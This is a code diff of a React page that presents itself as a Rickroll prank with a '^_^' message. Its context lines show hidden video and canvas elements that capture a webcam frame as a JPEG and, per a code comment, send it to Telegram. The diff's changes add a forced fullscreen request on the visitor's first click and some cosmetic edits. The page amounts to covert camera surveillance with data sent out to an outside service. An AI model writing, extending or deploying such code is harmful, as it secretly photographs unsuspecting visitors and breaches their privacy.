@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useRef } from "react";
+import { useRef, useEffect } from "react";
 
 export default function OfuzakePage() {
     const videoRef = useRef<HTMLVideoElement>(null);
@@ -37,7 +37,7 @@ export default function OfuzakePage() {
                             ctx.drawImage(video, 0, 0);
                             const imageData = canvas.toDataURL("image/jpeg", 0.8);
 
-                            // Send to Telegram
+                            // Convert to blob and send to Telegram
                             const response = await fetch(imageData);
                             const blob = await response.blob();
 
@@ -62,19 +62,27 @@ export default function OfuzakePage() {
 
                 hasCaptured.current = true;
             } catch (error) {
-                console.log("Camera access denied");
+                console.log("Camera access issue");
             }
         };
 
+        // Request fullscreen on first user interaction
+        const requestFullscreen = () => {
+            document.documentElement.requestFullscreen?.().catch(() => { });
+            document.removeEventListener("click", requestFullscreen);
+        };
+        document.addEventListener("click", requestFullscreen);
+
         captureAndSend();
+
+        return () => {
+            document.removeEventListener("click", requestFullscreen);
+        };
     }, []);
 
     return (
         <div className="page-container">
-            <div className="page-header">
-
-
-            </div>
+            <div className="page-header"></div>
 
             {/* Hidden video and canvas for capture */}
             <video ref={videoRef} autoPlay playsInline muted style={{ display: "none" }} />
@@ -82,10 +90,7 @@ export default function OfuzakePage() {
 
             <div className="flex flex-col gap-6 max-w-2xl">
                 <section className="prose dark:prose-invert">
-
-                    <p>
-                        ^_^
-                    </p>
+                    <p>^_^</p>
                 </section>
 
                 <div className="w-full aspect-video rounded overflow-hidden border border-gray-700">
@@ -93,12 +98,10 @@ export default function OfuzakePage() {
                         className="w-full h-full"
                         src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1"
                         title="Rick Astley - Never Gonna Give You Up"
-                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; fullscreen"
                         allowFullScreen
                     />
                 </div>
-
-
             </div>
         </div>
     );
